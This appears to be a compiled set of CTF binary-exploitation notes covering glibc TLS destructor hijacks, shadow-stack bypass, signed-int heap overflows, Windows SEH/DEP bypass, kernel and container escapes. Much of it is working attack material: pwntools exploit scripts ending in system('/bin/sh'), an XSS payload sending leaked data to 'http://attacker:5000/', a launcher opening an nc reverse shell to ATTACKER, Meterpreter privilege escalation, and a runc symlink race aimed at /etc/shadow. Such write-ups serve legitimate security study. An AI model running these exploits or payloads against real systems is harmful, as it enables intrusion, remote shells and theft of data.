**Key insight:** `__call_tls_dtors` iterates a singly-linked list calling `PTR_DEMANGLE(func)(obj)` for each entry. Demangling is `ror(val, 0x11) ^ pointer_guard`. To encode: `rol(target ^ pointer_guard, 0x11)`. The pointer guard lives in TLS at a fixed offset — once leaked via FSOP stdout, the entire list is forgeable.

**When to use:** Modern glibc (2.34+) where `__free_hook`/`__malloc_hook` are removed and FSOP via `_IO_wfile_jumps` (House of Apple 2) is blocked or constrained. TLS destructor overwrite is an alternative exit-time code execution path.

---

## Custom Shadow Stack Bypass via Pointer Overflow (Midnight 2026)

**Pattern (Revenant):** Binary implements a userland shadow stack in `.bss` — each function call pushes the return address to both the hardware stack and a `shadow_stack[]` array, validating them on return. The `shadow_stack_ptr` index increments on every call but is **never bounds-checked**, allowing it to overflow past the array into adjacent `.bss` variables.

**Binary protections:**
- Full RELRO, NX enabled, **PIE disabled** (fixed addresses)
- SHSTK and IBT enabled (Intel CET — hardware shadow stack)
- No stack canary

**`.bss` memory layout:**
```text
0x406000: shadow_stack[512]   (512 × 8 = 4096 bytes)
0x407000: username[16]        (user-controlled via input)
0x407040: shadow_stack_ptr    (index into shadow_stack)
0x407048: shadow_stack_base
```

**Exploitation strategy:**
1. Trigger controlled recursion (e.g., `do_reset()` → `play()` loop) to increment `shadow_stack_ptr` exactly 512 times
2. After 512 iterations, `shadow_stack_ptr` points to `username` (user-controlled buffer)
3. Write the `win()` address into `username` via normal input
4. Overflow the stack buffer to overwrite the hardware return address with `win()`
5. On return, both shadow stack and hardware stack contain `win()` — validation passes

**Exploit code (pwntools):**
```python
from pwn import *

exe = ELF('./revenant')
io = process('./revenant')

# Calculate iterations needed to overflow shadow_stack_ptr to username
shadow_stack_addr = exe.symbols["shadow_stack"]
username_addr = exe.symbols["username"]
iterations = (username_addr - shadow_stack_addr) // 8  # 512

# Step 1: Write win() address into username buffer
name = fit(exe.symbols["win"])

# Step 2: Recurse 512 times to advance shadow_stack_ptr to username
for i in range(iterations):
    io.sendlineafter(b"Survivor name:\n", name)
    io.sendlineafter(b"[0] Flee", b"4")  # Trigger do_reset() -> play()

# Step 3: Overflow stack buffer with win() address
padding = 56  # offset to return address (32-byte buf + 24 bytes)
payload = fit({padding: exe.symbols["win"]})
io.sendlineafter(b"(0-255):\n", payload)

io.interactive()
```

**Key insight:** Userland shadow stack implementations that lack bounds checking on the stack pointer are vulnerable to pointer overflow. By recursing enough times, the validation pointer advances past the shadow stack array into adjacent user-controlled memory (e.g., a username buffer). Writing the desired return address there makes the shadow stack check pass, defeating the protection entirely. The required iteration count is `(target_addr - shadow_stack_base) / pointer_size`.

**Detection pattern:** Look for:
- `.bss` arrays used as shadow stacks (paired push/pop with function calls)
- Missing bounds check on the index variable
- User-writable `.bss` variables adjacent to (above) the shadow stack array
- Recursive function calls controllable from user input

---

## Signed Int Overflow to Negative OOB Heap Write + XSS-to-Binary Pwn Bridge (Midnight 2026)

**Pattern (Canvas of Fear):** Web application wraps a native binary (`canvas_manager`) behind a Flask API, with admin endpoints restricted to `127.0.0.1`. The binary manages "canvases" (heap-allocated pixel arrays) with a pixel SET command that computes a 2D index as `y * width + x` using a **signed 32-bit int**. Supplying large `y` values overflows the multiplication to a negative result, passing the bounds check (`index < width * height`) while accessing memory **before** the data buffer — a negative OOB heap write primitive.

**Three-layer exploit chain:**
1. **Stored XSS** (Flask `|safe` Jinja filter) → admin bot executes JS at `127.0.0.1`
2. **XSS payloads call admin API** (Fetch API) → triggers binary commands
3. **Integer overflow → heap corruption → libc/stack leak → ROP chain**

### Heap Primitive: Signed Int Overflow in Index Calculation

The pixel index formula `y * width + x` wraps in 32-bit signed arithmetic:
```python
# For a 50x50 canvas: (8589934591 * 50 + 42) as int32 = -8
# After ×3 for RGB byte offset: -24 bytes before the data buffer
# This overwrites the canvas struct's height field (preceding the data on heap)
cmd(b'SET 1 42 8589934591 0x340000')  # overwrite height: 0x32 → 0x34
```

**Key insight:** The bounds check `index < width * height` uses signed comparison, so a negative overflow result always passes. This turns a single pixel SET into a backward OOB write into heap metadata or adjacent chunk headers.

### Full Exploitation Chain

```python
from pwn import *

# Step 1: Create canvases — canvas 3 acts as consolidation blocker
cmd(b'CREATE 1 50 50')   # large canvas (target for OOB write)
cmd(b'CREATE 2 20 20')   # victim (will be freed for unsorted bin leak)
cmd(b'CREATE 3 20 20')   # pivot (data pointer will be overwritten)

# Step 2: Free canvas 2 → unsorted bin puts libc pointers on heap
cmd(b'DELETE 2')

# Step 3: Overflow canvas 1's height field (0x32 → 0x34)
cmd(b'SET 1 42 8589934591 0x340000')

# Step 4: Read canvas 1 (now oversized) to leak heap + libc from freed chunk
cmd(b'GET 1')
# Parse RGB output: skip to offset 2507, extract fd/bk pointers
# heap_base = unpack(data[2:10]) << 12
# libc.address = unpack(data[34:42]) - 0x1edcc0

# Step 5: Remove size limit for full OOB write
cmd(b'SET 1 42 8589934591 0xffffff')

# Step 6: Overwrite canvas 3's data pointer → libc.sym['environ']
# Offset 0x2250 bytes from canvas 1's data to canvas 3's pointer field
target = unpack(pack(libc.sym["environ"]), endianness='big')
cmd(f'SET 1 2928 0 {hex((target >> 40) & 0xffffff)}'.encode())
cmd(f'SET 1 2929 0 {hex((target >> 16) & 0xffffff)}'.encode())

# Step 7: Read canvas 3 → reads *environ → stack leak
cmd(b'GET 3')
# main_ret = stack_leak - 0x140

# Step 8: Redirect canvas 3 pointer → main's return address on stack
target = unpack(pack(main_ret), endianness='big')
cmd(f'SET 1 2928 0 {hex((target >> 40) & 0xffffff)}'.encode())
cmd(f'SET 1 2929 0 {hex((target >> 16) & 0xffffff)}'.encode())

# Step 9: Write ROP chain via canvas 3 (3 bytes per pixel = per SET)
pop_rdi = libc.address + 0x2d7a2
ret = libc.address + 0x2c495
binsh = next(libc.search(b'/bin/sh\x00'))
payload = flat({0: [pop_rdi, binsh, ret, libc.sym["system"]]})
for i in range(0, len(payload), 3):
    block = unpack(payload[i:i+3][::-1].ljust(8, b'\x00')) & 0xffffff
    cmd(f'SET 3 {i//3} 0 0x{block:06x}'.encode())

# Step 10: EXIT triggers main() return → ROP chain executes
cmd(b'EXIT')
```

### XSS-to-Binary Pwn Bridge

When the binary is behind a web API with admin-only endpoints:

1. **Stored XSS via Flask `|safe`:** User messages rendered with `{{ msg.content | safe }}` bypass Jinja autoescaping. Submit `<script type="module">...</script>` via the public message endpoint
2. **Admin bot visits `/admin/messages`** from `127.0.0.1` → XSS executes
3. **Multi-stage payloads:** Each XSS stage calls admin API endpoints via `fetch()`, exfiltrates leaks to attacker VPS, then the next stage uses computed addresses:
   ```javascript
   // Stage 1: trigger heap commands, exfiltrate leak
   var res = await fetch("/api/canvas/get/1");
   var data = await res.json();
   await fetch('http://attacker:5000/', {
       method: 'POST', mode: 'no-cors',
       body: JSON.stringify({"pixels": btoa(JSON.stringify(data.pixels))})
   });
   ```
4. **Newline injection for command stacking:** The API uses `pwntools.sendline()` to forward user input to the binary. Injecting `\n` in a parameter (e.g., `"color": "#000000\nEXIT\n"`) executes multiple binary commands in one request, bypassing the API's EXIT-then-restart logic:
   ```javascript
   // Inject EXIT without triggering restart, then run shell commands
   body: JSON.stringify({"id": 9, "x": 0, "y": 0, "color": "#000000\nEXIT"})
   // Subsequent requests inject shell commands:
   body: JSON.stringify({"id": 9, "x": 0, "y": 0, "color": "#000000\n./read_flag"})
   ```

**Key insight:** The 3-byte RGB pixel value maps naturally to a 24-bit arbitrary write primitive — each SET writes 3 bytes at a controlled offset. Overwriting a canvas's data pointer (via OOB from another canvas) transforms pixel read/write into full arbitrary read/write. The `environ` → stack leak → ROP chain pipeline converts this into RCE. When the binary sits behind a web API, XSS bridges the network boundary and newline injection through `sendline()` enables command stacking.

**Detection pattern:**
- Index computation using signed int multiplication on user-controlled values
- Bounds check using signed comparison (negative values always pass)
- Adjacent heap allocations where metadata/pointers follow data buffers
- Web API that passes user input directly to `process.sendline()` without newline sanitization
- Flask templates with `|safe` filter on user-controlled content

---

## Windows SEH Overwrite + pushad VirtualAlloc ROP (RainbowTwo HTB)

**Pattern:** 32-bit Windows PE (Portable Executable) with ASLR (Address Space Layout Randomization), DEP (Data Execution Prevention), and GS (stack cookie) enabled but SafeSEH disabled. Combine format string leak (defeats ASLR) with SEH-based (Structured Exception Handler) buffer overflow using VirtualAlloc ROP chain to bypass DEP.

**Attack chain:**
1. **Format string leak defeats ASLR:** User input used as printf format string leaks code pointer at position 2: `LST %p-%p-%p-%p-%p` → `binary_base = int(leaks[1], 16) - 0x14120`
2. **Buffer overflow triggers SEH:** `sprintf("Path: %s", user_path)` into 1024-byte buffer overflows into SEH handler chain
3. **Stack pivot via SEH handler:** `add esp, 0xe10; ret` redirects from exception context into ROP chain
4. **Ret-slide absorbs crash variation:** 30x `ret` gadgets at start of ROP chain absorb variable crash offset
5. **pushad VirtualAlloc technique:** Set all 8 registers to correct values, then `pushad` builds the entire `VirtualAlloc(lpAddress, dwSize=1, flAllocationType=0x1000, flProtect=0x40)` call frame in one instruction
6. **IAT-relative function resolution:** `VirtualAlloc` not in IAT (Import Address Table), but `TlsAlloc` is. Read `[TlsAlloc@IAT]`, add offset to get `VirtualAlloc` address — offset calculated from provided `kernel32.dll`
7. **jmp esp to shellcode:** After VirtualAlloc marks stack RWX (Read-Write-Execute), `jmp esp` executes shellcode that follows

```python
# Key ROP chain structure (simplified)
rop  = p32(base + RET) * 30              # ret-slide for stability

# Set flProtect = 0x40 (PAGE_EXECUTE_READWRITE) via subtraction (avoid nulls)
rop += p32(base + POP_EAX) + p32(0x8314c2ab)
rop += p32(base + SUB_EAX)               # sub eax, 0x8314c26b → eax = 0x40

# Resolve VirtualAlloc: [TlsAlloc@IAT] + offset
rop += p32(base + POP_EAX) + p32(base + TLSALLOC_IAT)
rop += p32(base + MOV_EAX_DEREF_EAX)     # eax = TlsAlloc address
rop += p32(base + ADD_EAX_EDI)           # eax = VirtualAlloc address

# pushad builds call frame, jmp esp runs shellcode
rop += p32(base + PUSHAD_RET)
rop += p32(base + JMP_ESP)
```

**Bad characters for shellcode:** `\x00` (sprintf null), `\x09-\x0d` (whitespace), `\x20` (space), `\x25` (% triggers format string). Encode with msfvenom's shikata_ga_nai to avoid these bytes.

**Detached process for shell stability:** When exploiting thread-based servers, child processes die with the parent thread. Compile a launcher with `CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS` flags:
```c
// i686-w64-mingw32-gcc launcher.c -o launcher.exe -static
#include <windows.h>
int main() {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL, "C:\\shared\\nc.exe ATTACKER 9002 -e cmd.exe",
        NULL, NULL, FALSE,
        CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);
    return 0;
}
```

**Key insight:** `pushad` pushes all 8 general-purpose registers (EDI, ESI, EBP, ESP, EBX, EDX, ECX, EAX) onto the stack in one instruction. By pre-loading each register with the correct value, `pushad` builds the entire STDCALL function call frame in the exact order Windows expects. This avoids the need for `mov [esp+N], reg` gadgets which are rare.

---

## SeDebugPrivilege to SYSTEM (RainbowTwo HTB)

Exploits `SeDebugPrivilege` to escalate to SYSTEM by migrating into a SYSTEM-owned process. The privilege allows debugging any process, even if listed as "Disabled" — Meterpreter enables it automatically before use.

**Steps:**
1. Upload Meterpreter payload and obtain a session
2. Migrate into a SYSTEM-level process:
```text
meterpreter > migrate -N winlogon.exe
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```

Meterpreter's `migrate` injects a DLL into the target process (`winlogon.exe`, `lsass.exe`), running code as that process's user (SYSTEM).

**Detection:** `whoami /priv` shows `SeDebugPrivilege`. Common on service accounts and `NT AUTHORITY\SERVICE`.

**Key insight:** Always run `whoami /priv` after landing a Windows shell. `SeDebugPrivilege` — even when shown as "Disabled" — is a direct path to SYSTEM via process migration.

---

See [advanced-exploits.md](advanced-exploits.md) for VM signed comparison, BF JIT shellcode, type confusion, ASAN shadow memory, format string with encoding constraints, MD5 preimage gadgets, VM GC UAF, FSOP + seccomp bypass, and stack variable overlap techniques.

See [rop-advanced.md](rop-advanced.md) for `.fini_array` hijack details.

See [sandbox-escape.md](sandbox-escape.md) for shell tricks and restricted environment techniques.

---

## strace Byte-Count Side-Channel (404CTF 2024 "Nanocombattants")

**Pattern:** A crackme validates input character-by-character, exiting early on mismatch. Classic timing side-channel — but wall-clock measurements are too noisy when the per-char work is tiny (mmap + fork + shared-memory handshake).

**Trick:** run the binary under `strace -f -c` (or `strace -f -e trace=all`) and count **stderr bytes** emitted, not elapsed time. Each correct char traverses more syscalls (extra fork/wait/read/munmap) → distinguishable size bands:
```
correct prefix  : ~7100–7500 bytes of strace output
wrong at pos k  : ~10651 bytes (noisy exit path)
```
Byte count is discrete and noise-free — orders of magnitude more reliable than `clock_gettime` on a loaded box.

```bash
# Bruteforce char c at position i using byte-count oracle
for c in $(python3 -c "import string; print(' '.join(string.printable[:94]))"); do
    size=$(strace -f -c ./chall <<< "$PREFIX$c" 2>&1 | wc -c)
    echo "$c -> $size"
done | sort -k3 -n | head -5
```

**Generalisation:** any process whose *syscall pattern* diverges on validation outcome leaks the outcome via strace output length. Useful when perf counters are restricted or `rdtsc` is unavailable.

Source: [mathishammel.com/blog/writeup-404ctf-nanocombattants](https://mathishammel.com/blog/writeup-404ctf-nanocombattants).

---

## Signed-to-size_t Type Confusion Triggering Stack Overflow

**Pattern (Root-Me snippet 05, recurring in real CVEs):** Length arrives as signed `int`, bounds-check against an upper limit only:
```c
int len = read_from_user();
if (len > 64) return -1;        // negative passes through
read(fd, buf, len);              // len promoted to size_t → ~2 GB write
```
`abs(INT_MIN)` returns `INT_MIN` — still negative. When the *negative* `int` is passed to a `size_t`-typed API (`read`, `memcpy`, `recv`), it is reinterpreted as a huge unsigned value → massive OOB write → stack/heap smash.

**Spot signals during audit:**
- `len` is `int`, `int32_t`, or `ssize_t`, but caller uses `memcpy`/`read`/`recv` (take `size_t`).
- Only an upper-bound check is present (`if (n > MAX)`) — no `n < 0 || n > MAX`.
- Values derived from subtraction of user-controlled offsets.

**Exploit idea:** submit `len = -1` (0xFFFFFFFF as size_t) → unbounded write → overwrite saved RIP → classic ROP.

**In CTF reverse/pwn hybrids:** once you see `int len` + unchecked `if (len > X)` + `read(fd, buf, len)`, the vulnerability is this, not a heap bug.

Source: [blog.root-me.org/posts/writeup_snippet_05](https://blog.root-me.org/posts/writeup_snippet_05/).

---




---

<!-- Source: advanced-exploits-3.md -->

# Advanced Exploits — Part 3 (2025-2026 era)

Spin-off of `advanced-exploits-2.md` grouping the 2025-2026 mechanics (SekaiCTF 2025, HTB 2025, Midnightflag 2025, hxp 2024/2025, pwn.college AoP 2025). Keep `-2.md` for 2024-early-2025 exploits; add new 2025-2026 sections here to stay under 500 lines.


## Coordinate-Indexed Custom Filesystem Stack Overflow (source: SekaiCTF 2025 vkfs)

**Trigger:** a userspace "filesystem" where `open`/`rename` build a path from tuples `(mip, x, y)` and hash SHA-256 of the path segments; no length check on `old_path`/`new_path` beyond parent directory.
**Signals:** `vk_rename`, `vk_open`, `VK_PATH_MAX` macro on a single component, inode table keyed by SHA-256, no stack canary.
**Mechanic:** overflow via oversize component clobbers an adjacent `header`/`coord` struct still on stack, letting you craft an inode lookup that crosses a mip boundary (i.e. reads a sibling level that contains the flag). SHA-256 collisions on short components are brute-forceable because the FS prefixes a small fixed header; precompute pairs offline.
**Automation hook:** when `triage.sh` sees filenames that contain `mip_`/`coord_`/`layer_` prefixes + a binary without canary, emit this hint.
Source: [blog.zafirr.dev/en/2025-08-18-sekai-ctf-2025-vkfs-write-up](https://blog.zafirr.dev/en/2025-08-18-sekai-ctf-2025-vkfs-write-up).

## MIPS `$gp`-Pivot Fake-GOT (source: SekaiCTF 2025 outdated)

**Trigger:** MIPS ELF exposing a stack/global overflow; binary loads `$gp` from a user-reachable slot (e.g. saved in a struct at a fixed offset).
**Signals:** `readelf -A` shows MIPS ABI; `$gp` register used for all PIC-GOT indirection; no PIE / no randomization of a writable global.
**Mechanic:** overflow the saved `$gp` so that the next lib call (e.g. `puts`) resolves through a fake GOT placed at that global. Two-stage: stage-1 GOT routes `puts → puts` but also leaks libc via controlled arg; stage-2 reflip `$gp` so `puts → system("/bin/sh")`. Works on MIPS where no ROP gadgets exist but function-pointer redirect is trivial via GOT.
**Why it matters:** replaces ret2libc on MIPS, where reliable gadgets are scarce.
Source: [github.com/project-sekai-ctf/sekaictf-2025/tree/main/pwn/outdated](https://github.com/project-sekai-ctf/sekaictf-2025/tree/main/pwn/outdated).

## FILE UAF + Format-String Bridge (source: HTB Business 2025 Starshard Core)

**Trigger:** binary has *both* (a) a format-string read on attacker input (leak primitive) and (b) a FILE* UAF via free-then-use of an `fopen` handle.
**Signals:** `printf(buf)` with no format specifier; `fclose(fp)` followed by `fread(fp,…)` or `fprintf(fp,…)` on the same pointer.
**Mechanic:** format string leaks canary + arena + libc; heap spray places a forged `_IO_FILE` in the freed slot with controlled `_IO_write_ptr`/`vtable`; next `fread` dispatches attacker vtable → FSOPAgain shell. Acts as a bridge between two mild primitives neither of which alone gives code exec.
Source: [github.com/hackthebox/university-ctf-2025/pwn/Starshard%20Core](https://github.com/hackthebox/university-ctf-2025/pwn/Starshard%20Core).

## Cross-Thread `alloca()` Stack Smash + Partial-Close Leak (source: Midnightflag 2025)

**Trigger:** multi-threaded pwn with `alloca(user_n)` (user-controlled `n`) and any socket path that performs `shutdown(fd, SHUT_WR)` without `close()`.
**Signals:** pthread present, adjacent thread stacks in `/proc/<pid>/maps`, `alloca` in disasm, buffered-but-not-flushed IO pattern.
**Mechanic:** huge `alloca` pushes `$sp` into sibling thread B's stack region; subsequent writes smash B's saved return. Partial socket shutdown holds the kernel buffer open: send uninit bytes back to leak libc base and stack canary of the sibling thread.
**Generalisation:** any `alloca(x)` with non-trivial upper bound — test sibling-thread stack adjacency with `pthread_attr_getstack`.
Source: [ptr-yudai.hatenablog.com/entry/2025/04/22/145743](https://ptr-yudai.hatenablog.com/entry/2025/04/22/145743).

## Objective-C UAF: Isa-Pointer Overlap → Dispatch Hijack (source: Midnightflag 2025)

**Trigger:** binary linked against `libobjc`; freed `NSObject*`/`NSString*` kept as `id` and later messaged via `objc_msgSend`.
**Signals:** `objc_msgSend` in disasm, tcache-sized objects, `[obj-class-name]`-style dispatch after free.
**Mechanic:** place a forged object in tcache whose first 8 bytes (`isa`) point to an attacker-crafted class. `class_getName` resolves via `[isa+OFF]`; chain gadgets of the form `mov rax,[rdi+8]; ret;` to drive method-table lookup into controlled memory for PC control. No sandbox escape needed; primary use on macOS/iOS pwn or any Linux app that embedded libobjc.

## ARM64 PAC-Key Exfil via Bounds-Mismatch AAR (source: Midnightflag 2025)

**Trigger:** aarch64 kernel module signing syscall entry/exit with PAC (paciza/autiza), IOCTL that bounds-checks against `sizeof(struct)` instead of the real buffer length.
**Signals:** `.text` contains `paciza`/`autiza`; two IOCTLs where one reads and one writes an offset from a base.
**Mechanic:** the bounds mismatch gives an AAR that can overlap the current task's saved context (including PAC subkeys). Read subkey → locally sign an attacker-chosen pointer with `pacia` → feed it back via the second IOCTL for an AAW. Overwrite `cred->uid = 0`. PAC bypass without MTE.

## `cmp` Timing Oracle in Seccomp-`write`-Killed Jail (source: Midnightflag 2025)

**Trigger:** seccomp filter kills `write`/`socket`/`sendto` but allows `execve` and `open`/`read` on `/flag`; no `SIGSYS` handler.
**Signals:** seccomp JSON / bpf bytecode dumped; `/usr/bin/cmp` present; no observable IO channel.
**Mechanic:** `execve("/usr/bin/cmp", ["/flag", "/tmp/guess"])` exits with status 0/1/2 but the elapsed *time* varies with how many bytes matched before mismatch. Measure `wait4`'s ru_utime (if accessible) or wall time — byte-by-byte flag oracle with no writable channel. Generalises: any jail that forbids output but allows a precise time-consuming operation.

## Traefik `X-Forwarded-*` Admin Reach → Polyglot RCE Chain (source: HTB Business 2025 novacore)

**Trigger:** Traefik ≤ 2.11.13 in front of Flask/Node, admin routes supposedly guarded by middleware reading `X-Forwarded-Prefix`/`X-Forwarded-Host`.
**Signals:** `traefik.yml`/`traefik.toml` without `forwardedHeaders.insecure: false`; the Traefik version string in response headers.
**Mechanic:** (1) forge `X-Forwarded-Prefix: /admin` to reach protected routes → (2) cache poison + DOM-clobber inside the admin SPA → (3) upload endpoint accepts TAR with traversal filename → (4) craft TAR/ELF polyglot (first 262 bytes valid TAR header with traversal filename, body valid ELF) → extractor writes ELF to chosen path → second endpoint execs. Full chain from header smuggle to RCE.
Source: [github.com/hackthebox/business-ctf-2025/web/novacore](https://github.com/hackthebox/business-ctf-2025/web/novacore).

## MMap-Oriented Programming (MOP) — libc Code-Page Zeroing (LA CTF 2025 "mmapro")

**Pattern:** Challenge exposes an `mmap()` primitive where attacker controls `addr`, `length`, `prot`, `flags`. With `MAP_FIXED`, unmap-and-remap overwrites existing mappings — **including the libc `.text` segment** of the running process.

**The trick:** remap a libc code page as `PROT_READ|PROT_WRITE|PROT_EXEC` backed by zero-filled anonymous memory. When control returns to that page, CPU executes runs of `\x00\x00\x00...` — on x86-64 that's `add byte ptr [rax], al` over and over. It's effectively a **NOP-slide gadget inside a valid `.text` mapping**, so no CFI/CET tripwire fires (no indirect branch target mismatch, the mapping is still "libc code").

**Why it's new:**
- Classic ROP lives inside the (now-checked) `.text`. MOP *rewrites* `.text`.
- CET shadow-stack only checks returns; the NOP-slide doesn't touch returns until it reaches attacker-placed shellcode.
- Works even when no `rwx` region exists normally — `MAP_FIXED` is the primitive.

**Skeleton:**
```python
# Remap libc page containing the next-executed instruction as zeros (PROT_RWX).
# CPU runs "add [rax], al" indefinitely through the page, then hits controlled shellcode.
mmap(libc_text_page, 0x1000, PROT_RWX, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
# Write shellcode at the *end* of that page (or next page) so NOP-slide lands on it.
```

**Hunt signal:** challenge hands you `mmap` / `mremap` with attacker-controlled args but denies plain `execve`/shellcode. Check whether `MAP_FIXED` is allowed — if yes, consider libc zeroing before classic ROP.

Source: [enzo.run/posts/lactf2025](https://enzo.run/posts/lactf2025/).

---

## Pipe-Backed Page UAF via folio_put (corCTF 2025 "corphone")

**Target:** Android / Linux kernel, glibc 2.38+. Classic pipe_buffer tricks (overwriting `f_op` etc.) are well-mitigated. New primitive:

**Pattern:** `kfree()` a large kmalloc object whose backing pages were first **grafted onto a pipe** via `splice()`/`vmsplice()`. The kernel path `free_large_kmalloc → folio_put(folio)` emits a WARN but proceeds — yet the folio is still referenced by the pipe. Result: **page-level UAF**, not slab-level.

**Why it matters:**
- Sidesteps slab-granularity mitigations (hardened usercopy, random_kmalloc_caches).
- Gives attacker a whole page of typed-object reuse territory — much richer than 64-byte slot.
- Cross-cache attacks worked around slab caches; this works around the *slab layer entirely*.

**Exploit skeleton:**
1. Allocate a large kmalloc object (`kmalloc-4k` or bigger, `__GFP_COMP` order ≥ 1).
2. `splice()` the pages into a pipe → pipe holds a reference to the folio.
3. Trigger `kfree()` on the object (e.g. close the owning fd) → `folio_put` is called but refcount stays ≥ 1 via pipe.
4. Re-allocate the same physical page as a typed kernel object (e.g. `cred`, `file`, `task_struct`).
5. Read/write it through the pipe — typed-object UAF at page granularity.

Follow-up primitive used in corphone: **patch `avc_denied()` in-place** to neutralise SELinux once kernel R/W is achieved — simpler than forging `selinux_state`.

Source: [u1f383.github.io/android/2025/09/08/corCTF-2025-corphone](https://u1f383.github.io/android/2025/09/08/corCTF-2025-corphone.html).

---

## Unicorn Emulator Host/Guest Hook Divergence (Google CTF 2025 "Unicornel Trustzone")

**Pattern:** Challenge implements a "trustzone" by running user code under a Unicorn Engine emulator with memory hooks to deny reads of secret regions. Bug: `uc_mem_read()` from the **host side** (the Python controller that drives the emulator) does **not** fire guest hooks.

**Consequence:** any primitive that smuggles a guest operation into a host-side `uc_mem_read` bypasses the access control entirely.

**Secondary bug chained:** integer overflow in `src + n` bounds-check — pass `n = 0x1000` with `src = 0xFFFFFFFF...F000` so `src + n == 0` wraps below the real end; bounds check passes, then actual read reaches arbitrary guest memory.

**Third step:** remap emulator's RWX page of the host process to inject shellcode, then overwrite a GOT entry the emulator calls → control host. Bridges "CPU emulator fuzzing" with classic userland pwn.

**Takeaway:** when a challenge uses Unicorn/QEMU as a sandbox, check whether callbacks/hooks apply only to guest-originated ops. Any host-side helper (debug reads, checkpointing) is often unhooked.

Source: [chovid99.github.io/posts/google-ctf-2025](https://chovid99.github.io/posts/google-ctf-2025/).

---

## runc 2025 Symlink-Race Container Escape (CVE-2025-31133/52565/52881)

**Targets:** CVE-2025-31133, CVE-2025-52565, CVE-2025-52881 — three related symlink-race / bind-mount-redirect bugs in `runc` (disclosed Nov 2025). Appearing in late-2025 / 2026 CTFs.

**Core pattern:** runc bind-mounts paths like `/dev/null` or `/proc/self/attr/exec` from the host into the container in RW mode. Before the mount completes, the container process replaces the target path with a **symlink** pointing at a sensitive host file. runc follows the symlink and mounts the wrong target RW.

```bash
# Racy in-container primitive (pseudo):
while true; do
    ln -sf /host/etc/shadow /dev/null    # swap target behind runc's back
done &
# Trigger container operation that causes runc to re-mount /dev/null → wins race occasionally.
```

After winning: write to `/dev/null` inside the container → actually writes to `/etc/shadow` on the host. Combine with an LPE helper (e.g. overwrite `/etc/sudoers` or `/proc/1/attr/exec`).

**CTF tell-tales:**
- Challenge hands you an unprivileged shell *inside* a container with custom mount configs (e.g. extra `bind` mounts on `/proc` or `/dev`).
- Container runtime is `runc <= 1.1.x` (check `/proc/self/cgroup` + version probe).
- `/proc` is partially writable or has bind-mounts configured.

**Mitigation the challenge might still miss:** `runc --keep-safe-handles` or upgraded runc >= 1.2.0 patches. If you see those absent, try the symlink swap.

Source: [cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/).


---

For 2025-2026 era mechanics (vkfs coord-indexed overflow, MIPS `$gp`-pivot, FILE UAF+fstr bridge, alloca cross-thread, ObjC Isa UAF, ARM64 PAC exfil, cmp timing oracle, Traefik polyglot chain), see [advanced-exploits-3.md](advanced-exploits-3.md).



---

<!-- Source: advanced-exploits.md -->

# CTF Pwn - Advanced Exploit Techniques

## Table of Contents
- [VM Signed Comparison Bug (0xFun 2026)](#vm-signed-comparison-bug-0xfun-2026)
- [BF JIT Unbalanced Bracket to RWX Shellcode (VuwCTF 2025)](#bf-jit-unbalanced-bracket-to-rwx-shellcode-vuwctf-2025)
- [Type Confusion in Interpreter (VuwCTF 2025)](#type-confusion-in-interpreter-vuwctf-2025)
- [Off-by-One Index to Size Corruption (VuwCTF 2025)](#off-by-one-index-to-size-corruption-vuwctf-2025)
- [Double win() Call Pattern (VuwCTF 2025)](#double-win-call-pattern-vuwctf-2025)
- [DNS Record Buffer Overflow](#dns-record-buffer-overflow)
- [ASAN Shadow Memory Exploitation](#asan-shadow-memory-exploitation)
- [Format String with Encoding Constraints + RWX .fini_array Hijack](#format-string-with-encoding-constraints--rwx-fini_array-hijack)
- [Custom Canary Preservation](#custom-canary-preservation)
- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
- [MD5 Preimage Gadget Construction](#md5-preimage-gadget-construction)
- [VM GC-Triggered UAF — Slab Reuse (EHAX 2026)](#vm-gc-triggered-uaf--slab-reuse-ehax-2026)
- [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
- [FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)](#fsop--seccomp-bypass-via-openatmmapwrite-ehax-2026)
- [Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)](#stack-variable-overlap--carry-corruption-oob-srdnlenctf-2026)
- [1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)](#1-byte-overflow-via-8-bit-loop-counter-srdnlenctf-2026)

---

## VM Signed Comparison Bug (0xFun 2026)

**Pattern (CHAOS ENGINE):** Custom VM STORE opcode checks `offset <= 0xfff` with signed `jle` but no lower bound check.

**Exploit:**
1. Negative offsets reach function pointer table below data area
2. Build values byte-by-byte in VM memory using VM arithmetic
3. LOAD as qwords, compute negative offsets via XOR with 0xFF..FF
4. Overwrite HALT handler with `system@plt`
5. Trigger HALT with "sh" string pointer as argument

**General lesson:** Signed vs unsigned comparison bugs in custom VMs are common. Always check bounds in both directions. Function pointer tables near data buffers = easy RCE.

---

## BF JIT Unbalanced Bracket to RWX Shellcode (VuwCTF 2025)

**Pattern (Blazingly Fast Memory Unsafe):** BF JIT compiler uses stack for `[`/`]` control flow. Unbalanced `]` pops values from prologue.

**Vulnerability:** `]` (LOOP_END) pops return address from stack. Without matching `[`, it pops the **tape address** which resides in **RWX memory**.

**Exploit:**
```python
# Stage 1: Write shellcode to tape via BF +/- operations, then trigger ]
# Use - for bytes >127 (0xff = 1 decrement vs 255 increments)
stage1 = b''
# Build read(0, tape, 256) shellcode on tape
shellcode_bytes = asm(shellcraft.read(0, 'r14', 256))
for byte in shellcode_bytes:
    if byte <= 127:
        stage1 += b'+' * byte + b'>'
    else:
        stage1 += b'-' * (256 - byte) + b'>'
stage1 += b']'  # Unbalanced ] jumps to tape (RWX)

# Stage 2: Send full execve("/bin/sh") shellcode via stdin after Stage 1 runs
```

**Identification:** JIT compilers using stack for bracket matching + RWX tape memory.

---

## Type Confusion in Interpreter (VuwCTF 2025)

